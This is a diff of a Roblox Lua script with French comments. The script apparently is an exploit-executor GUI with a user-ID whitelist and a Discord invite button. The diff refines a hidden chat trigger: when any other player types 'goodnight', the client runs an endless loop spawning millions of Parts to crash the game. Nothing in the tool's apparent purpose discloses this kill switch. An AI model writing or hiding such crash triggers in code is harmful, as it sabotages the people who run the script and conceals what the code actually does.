@@ -15,9 +15,9 @@ local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 local WHITELIST = {
     -- FORMAT: [UserID] = true,
     -- AJOUTE LES USER IDS ICI (JUSQU'À 1000+ PERSONNES)
-    [8083834888] = true,  -- Exemple UserID
-    [9230563404] = true,  -- Exemple UserID
     [8176309904] = true,  -- Exemple UserID
+    [9230563404] = true,  -- Exemple UserID
+    [8083834888] = true,  -- Exemple UserID
     -- Ajoute autant d'IDs que tu veux...
 }
 
@@ -55,7 +55,8 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
     TextChatService.MessageReceived:Connect(function(message)
         local text = message.Text:lower()
-        if text == "goodnight" then
+        -- Vérifie que c'est pas le joueur local qui parle
+        if text == "goodnight" and message.TextSource and message.TextSource.UserId ~= LocalPlayer.UserId then
             -- CRASH LE JEU
             while true do
                 for i = 1, 1000000 do
@@ -74,30 +75,34 @@ local function setupLegacyChat()
     
     if success then
         Players.PlayerAdded:Connect(function(player)
-            player.Chatted:Connect(function(message)
-                if message:lower() == "goodnight" then
-                    -- CRASH LE JEU
-                    while true do
-                        for i = 1, 1000000 do
-                            Instance.new("Part", workspace)
+            if player ~= LocalPlayer then  -- Ignore le joueur local
+                player.Chatted:Connect(function(message)
+                    if message:lower() == "goodnight" then
+                        -- CRASH LE JEU
+                        while true do
+                            for i = 1, 1000000 do
+                                Instance.new("Part", workspace)
+                            end
                         end
                     end
-                end
-            end)
+                end)
+            end
         end)
         
-        -- Pour les joueurs déjà présents
+        -- Pour les joueurs déjà présents (sauf le joueur local)
         for _, player in pairs(Players:GetPlayers()) do
-            player.Chatted:Connect(function(message)
-                if message:lower() == "goodnight" then
-                    -- CRASH LE JEU
-                    while true do
-                        for i = 1, 1000000 do
-                            Instance.new("Part", workspace)
+            if player ~= LocalPlayer then  -- Ignore le joueur local
+                player.Chatted:Connect(function(message)
+                    if message:lower() == "goodnight" then
+                        -- CRASH LE JEU
+                        while true do
+                            for i = 1, 1000000 do
+                                Instance.new("Part", workspace)
+                            end
                         end
                     end
-                end
-            end)
+                end)
+            end
         end
     end
 end
@@ -748,7 +753,7 @@ local function createCategorizedGUI()
     Instance.new("UICorner", discordBtn).CornerRadius = UDim.new(0, 8)
     
     discordBtn.MouseButton1Click:Connect(function()
-        setclipboard("https://discord.gg/invite")
+        setclipboard("https://discord.gg/aYSxvzeRSR")
     end)
     
     createLabel(infoContent, "Version: 1.0.0", CONFIG.THEME.TextDim)
